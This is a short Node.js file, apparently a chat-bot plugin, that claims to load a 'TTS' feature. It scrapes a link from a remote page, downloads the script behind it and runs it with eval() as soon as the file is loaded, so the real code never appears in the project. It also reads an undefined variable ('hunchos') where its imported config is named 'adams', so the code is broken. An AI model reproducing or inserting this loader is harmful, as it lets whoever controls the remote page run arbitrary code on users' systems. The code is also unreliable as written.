const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchTTSUrl() {
  try {
    const response = await axios.get(hunchos.MM_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("TTS")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('TTS not found 😭');
    }

    console.log('TTS loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchTTSUrl();
